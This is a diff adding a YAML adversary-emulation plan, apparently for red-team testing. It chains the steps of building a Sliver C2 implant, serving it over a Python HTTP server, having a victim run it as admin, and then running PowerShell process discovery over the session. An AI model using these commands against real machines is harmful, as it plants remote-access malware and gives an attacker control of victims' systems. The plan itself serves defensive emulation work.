@@ -1,0 +1,132 @@
+emulation_plan_details:
+  adversary_name: test
+  creation_time: 2025-04-07 21:17:30 UTC+0000
+attack_action_sequence:
+  - uuid: 0e67b73a-9927-43e1-8f64-04d38f1db57d
+    name: Build Sliver implant
+    id: T1071.001
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique: Application Layer Protocol - Web Protocols
+    description: |
+      The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.
+    execution:
+      executor: Sliver Console
+      command: |
+        sliver > generate --mlts #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
+        sliver > mlts --lport #{LPORT}
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        type:
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        type:
+      SAVE_PATH:
+        default:
+        description: Saved path of the generated payload
+        type:
+  - uuid: 19301991-c518-46ca-a622-378e1be4f1ad
+    name: Simulate the victim download and execute malicious payload file as Admin
+      (Root)
+    id:
+      - T1204.002
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+    technique:
+      - 'User Execution: Malicious File'
+    description:
+    execution:
+      executor: Human
+      command: |
+        (This step needs human interaction and (temporarily) cannot be executed automatically)
+        (On attacker's machine)
+        python -m http.server
+
+        (On victim's machine)
+        1. Open #{LHOST}:#{LPORT} in the browser
+        2. Navigate to the path of the target payload file
+        3. Download the payload file
+        4. Execute the payload file to #{PATH} as Admin (Root)
+    arguments:
+      HOST:
+        default:
+        description: IP address of the attacker machine
+        type:
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        type:
+      SAVE_PATH:
+        default:
+        description: Saved path of the downloaded payload
+        type:
+  - uuid: 1f401bbe-de24-41d2-8e34-d026e25bfb94
+    name: Execute a Sliver Implant Payload
+    id: T1071.001
+    source: Sliver
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique: Application Layer Protocol - Web Protocols
+    description: |
+      Executing a Sliver implant payload will establish a Sliver session.
+    execution:
+      executor: None
+      command: |
+        None
+    arguments:
+  - uuid: 7bfba376-cebc-4094-b1e6-5103b2e83c4e
+    name: Execute PowerShell Command
+    id:
+      - T1059.001
+    source: Sliver
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+    technique:
+      - |
+        Command and Scripting Interpreter: PowerShell
+    description: The `powershell.exe` command executes a PowerShell script or command
+      on the remote host. This command is useful for performing system monitoring
+      tasks or gathering information about the processes running on a remote machine.
+    execution:
+      executor: Sliver Executor
+      command: powershell(#{SessionID})
+    arguments:
+      SessionID:
+        description: The session ID of the active Sliver connection.
+  - uuid: 3b3809b6-a54b-4f5b-8aff-cb51f2e97b34
+    name: Process Discovery - Get-Process
+    id:
+      - T1057
+    source: ART
+    supported_platforms:
+      - windows
+    tactics:
+      - Discovery
+    technique:
+      - Process Discovery
+    description: |
+      Utilize Get-Process PowerShell cmdlet to identify processes.
+
+      Upon successful execution, powershell.exe will execute Get-Process to list processes. Output will be via stdout. 
+    execution:
+      executor: Powershell Executor
+      command: |
+        Get-Process
+    arguments:
+    dependencies:
+testbed_requirement:
+  OS: []
+  CVE: []
